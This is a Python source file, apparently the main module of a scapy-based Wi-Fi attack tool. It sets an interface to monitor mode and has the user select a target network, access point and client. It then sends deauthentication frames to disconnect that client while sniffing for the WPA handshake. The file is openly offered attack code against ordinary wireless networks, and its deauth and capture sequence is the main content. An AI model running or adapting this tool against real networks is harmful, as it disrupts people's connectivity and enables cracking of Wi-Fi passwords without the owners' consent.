"""
The main file for our program
Requires scapy 2.4.2, installable using `pip3 install scapy`
"""

import sys
import time

from scapy.layers.dot11 import Dot11FCS

import utilities
# Dot11Type = Dot11
from access_point import AccessPoint
from ap_sniffer import APSniffer
from channel_hopper import ChannelHopper
from client import Client
from deauth_sender import DeauthSender
from handshake_sniffer import HandshakeSniffer

from network import Network

Dot11Type = Dot11FCS

# Global used variables
networks = []  # All found networks (essids)
threads = set()  # All threads that are used should be addedd to this list
selected_network = None  # The network to attack
selected_ap = None  # The access point to attack


# The main function that will run on program start
def main():
    global iface, selected_network, selected_ap, threads

    utilities.require_root()

    utilities.initialize_mac_data()

    # Capture CTRL-C
    # signal.signal(signal.SIGINT, catch_exceptions)

    iface = input("Please specify the interface: ")
    utilities.set_mon_mode(iface, "monitor")

    channel_hopper_thread = ChannelHopper(iface)
    threads.add(channel_hopper_thread)
    channel_hopper_thread.start()

    selected_network = select_network()
    selected_ap = select_ap()
    channel_hopper_thread.stop = True
    channel_hopper_thread.join()
    utilities.set_channel(iface, selected_network.channel)
    selected_client = select_client()

    print("")
    print("You were going to attack the following network and this specific AP:")
    print(selected_network.essid + " - " + utilities.convert_mac(selected_ap.bssid))
    print("With the following client being the target:")
    print(selected_client)
    print("")
    sniff_handshake(selected_ap.bssid, selected_client.mac)

    print("Done running, exiting")

    finalize()


# Process for having the user select which Network to attack
def select_network():
    global threads, networks, iface, Dot11Type

    print("")
    print("Please specify the ID of the Network that you want to attack:")
    print(Network.get_header())
    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_networks=True)
    threads.add(sniff_thread)
    sniff_thread.start()

    network_id = int(input())
    if network_id < 0 or network_id >= len(networks):
        print("Error: Invalid network selected.")
        finalize()

    sniff_thread.stop = True
    sniff_thread.join()

    print("You selected Network ", network_id)
    return networks[network_id]


# Process for having the user select which AP to attack
def select_ap():
    global threads, iface, networks, Dot11Type, selected_network

    print("")
    print("Please specify the ID of the AP that you want to attack:")
    print(AccessPoint.get_header())
    for ap in selected_network.aps:
        print(ap)
    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_aps=True, target_network=selected_network)
    threads.add(sniff_thread)
    sniff_thread.start()

    ap_id = int(input())
    if ap_id < 0 or ap_id >= len(selected_network.aps):
        print("Error: Invalid access point selected.")
        finalize()

    sniff_thread.stop = True
    sniff_thread.join()

    print("You selected AP ", ap_id)
    return selected_network.aps[ap_id]


# Process for having the user select which client (associated with an AP) to attack
def select_client():
    global selected_ap

    print("")
    print("Please specify the ID of the Client that you want to attack:")
    print(Client.get_header())
    for client in selected_ap.clients:
        print(client)
    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_clients=True, target_network=selected_network)
    threads.add(sniff_thread)
    sniff_thread.start()

    client_id = int(input())
    if client_id < 0 or client_id >= len(selected_ap.clients):
        print("Error: Invalid client selected.")
        finalize()

    sniff_thread.stop = True
    sniff_thread.join()

    print("You selected Client ", client_id)
    return selected_ap.clients[client_id]


# Sends deauth attacks
def deauth(target_network, target_client):
    global iface

    input("Press enter to start sending deauth")
    deauth_start(target_network, target_client)
    input("Press enter to stop sending deauth")
    deauth_stop()


def deauth_start(target_ap, target_client):
    global threads, deauth_thread

    deauth_thread = DeauthSender(iface, target_ap, target_client)
    threads.add(deauth_thread)
    deauth_thread.start()


def deauth_stop():
    global threads, deauth_thread

    deauth_thread.stop = True
    deauth_thread.join()


# Sniff a handshake
def sniff_handshake(target_network, target_client):
    global iface, selected_ap, threads

    input("Press enter to start sniffing a handshake")
    deauth_start(target_network, target_client)
    handshake_sniffer_thread = HandshakeSniffer(iface)
    threads.add(handshake_sniffer_thread)
    handshake_sniffer_thread.start()

    time.sleep(3)
    deauth_stop()
    handshake_sniffer_thread.join()


# Executed when signal catches an exception (like CTRL+C) during runtime
def catch_exceptions(signal, frame):
    finalize()


# Clean up and shut down
def finalize():
    global iface, threads

    # Stop all threads that are still running
    alive_threads = [thread for thread in threads if thread.isAlive()]
    for thread in alive_threads:
        thread.stop = True
    for thread in alive_threads:
        if thread.isAlive():
            thread.join()

    # Put the network card back in managed mode
    utilities.set_mon_mode(iface, "managed")

    # Print some stats
    utilities.print_networks_stats(networks)

    # Stop the program
    sys.exit(0)


# Run the script
if __name__ == '__main__':
    main()
